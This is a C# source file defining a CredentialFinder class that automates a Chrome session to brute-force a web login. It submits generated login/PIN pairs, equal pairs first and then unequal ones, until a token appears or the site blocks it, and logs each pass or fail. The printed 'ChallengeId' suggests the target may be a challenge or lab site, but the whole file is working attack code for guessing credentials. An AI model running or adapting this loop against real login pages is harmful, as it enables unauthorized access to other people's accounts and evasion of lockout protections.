using Kamui.Browser;
using Kamui.Models;
using Kamui.Pages;

namespace Kamui.Discovery;

internal sealed class CredentialFinder
{
    public Credentials? Find()
    {
        using var session = new ChromeSession();
        var landing = new LandingPage(session.Driver);
        landing.Open(LandingPage.HomeUrl);
        landing.Start();

        var page = new AuthorizePage(session.Driver);
        Console.WriteLine($"Session ChallengeId: {page.ChallengeId}");

        return TryPairs(page, PinCandidates.EqualPairs())
            ?? TryPairs(page, PinCandidates.UnequalPairs());
    }

    static Credentials? TryPairs(AuthorizePage page, IEnumerable<Credentials> pairs)
    {
        foreach (var pair in pairs)
        {
            if (page.IsBlocked)
            {
                Console.WriteLine("Blocked during brute force.");
                return null;
            }

            var hit = TryPair(page, pair);
            if (hit is not null)
            {
                return hit;
            }
        }

        return null;
    }

    static Credentials? TryPair(AuthorizePage page, Credentials pair)
    {
        if (!page.HasLoginForm)
        {
            Console.WriteLine($"fail {pair} — login form missing. url={page.Url}");
            return null;
        }

        if (!page.SignIn(pair.Login, pair.Password))
        {
            Console.WriteLine($"fail {pair} — could not submit login");
            return null;
        }

        if (!Pause.Until(
                () => page.HasToken || page.IsWrongCredential || page.IsBlocked,
                TimeSpan.FromSeconds(12)))
        {
            Console.WriteLine($"fail {pair} timed out");
            return null;
        }

        if (page.IsBlocked)
        {
            Console.WriteLine($"fail {pair} blocked");
            return null;
        }

        if (page.IsWrongCredential)
        {
            Console.WriteLine($"fail {pair}");
            return null;
        }

        var token = page.ReadToken();
        if (token is null)
        {
            Console.WriteLine($"fail {pair} no token");
            return null;
        }

        Console.WriteLine($"pass {pair} occurrence={token.Value.Occurrence}");
        return pair;
    }
}
